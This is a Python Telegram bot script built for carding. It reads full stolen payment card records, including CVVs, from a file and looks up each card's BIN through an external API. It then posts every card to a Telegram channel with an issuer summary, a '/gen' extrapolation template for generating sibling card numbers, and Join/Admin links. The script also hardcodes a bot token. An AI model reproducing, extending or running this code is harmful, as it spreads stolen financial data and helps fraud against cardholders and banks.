import telebot
import random
import requests
import time
from telebot import types

TOKEN = "7263198575:AAFTDaY3qWUWbqL90WE2ywL0a3LVR3lbX48"
send_cc = -1002167005803

stickers = [
    '✨', '🔥', '🎉', '⚡️',  '🌨', '🌩', '💫', '💵', '💸',
]

kk = [
    'Scrape CC', 'New CC', 'CC Damp',
]

bot = telebot.TeleBot(TOKEN)

def get_bin_info(bin_number):
    api_url = f"https://bins.antipublic.cc/bins/{bin_number}"
    try:
        response = requests.get(api_url)
        if response.status_code == 200:
            return response.json()
        else:
            return None
    except Exception as e:
        print(f"Error fetching bin info: {e}")
        return None

def format_bin_info(bin_data, full_cc):
    cc_parts = full_cc.split("|")
    cc_number = cc_parts[0]
    cc_month = cc_parts[1] if len(cc_parts) > 1 else ""
    cc_year = cc_parts[2] if len(cc_parts) > 2 else ""
    cc_cvv = cc_parts[3] if len(cc_parts) > 3 else ""
    sticker = random.choice(stickers)
    random_kk = random.choice(kk)  # اختيار نص عشوائي من القائمة kk

    formatted_info = f"""
 ｢#bin{bin_data.get('bin', '')[:6]} 」
┏━━⚇
┃<b>{random_kk}  {sticker}  </b>
┗━━━━━━━━⊛
<b>✺ Card:</b><code> {full_cc}</code>
<b>✺ Extrap:</b> <code>/gen {cc_number[:12]}xxxx|{cc_month}|{cc_year}|xxx</code>
<b>✺ Info:</b> {bin_data.get('brand', '')} - {bin_data.get('type', '')}
<b>✺ Issuer:</b> {bin_data.get('bank', '')}
<b>✺ Country:</b> {bin_data.get('country_name', '')} - {bin_data.get('country_flag', '')}
    """
    return formatted_info

def send_file_lines_to_channel(cc_file):
    with open(cc_file, "r") as file:
        for line in file:
            full_cc = line.strip()
            bin_info = get_bin_info(full_cc[:6])
        
            if bin_info:
                formatted_info = format_bin_info(bin_info, full_cc)
                
                # إنشاء زرين
                markup = types.InlineKeyboardMarkup(row_width=2)  # زرين في صف واحد
                btn_right = types.InlineKeyboardButton(text="Join", url="https://t.me/+dAdU3nQ8TycyYTg8")
                btn_left = types.InlineKeyboardButton(text="Admin", url="https://t.me/The_Bigboos")
                markup.add(btn_right, btn_left)  # إضافة الزرين إلى الصف
                
                # إرسال الرسالة مع الأزرار
                bot.send_message(send_cc, formatted_info, parse_mode="HTML", reply_markup=markup)
                time.sleep(10)
                print(full_cc)
            else:
                print(f"Error fetching bin info for {full_cc}")

def recibir_msg():
    bot.infinity_polling()

if __name__ == "__main__":
    send_file_lines_to_channel("cc.txt")
    recibir_msg()
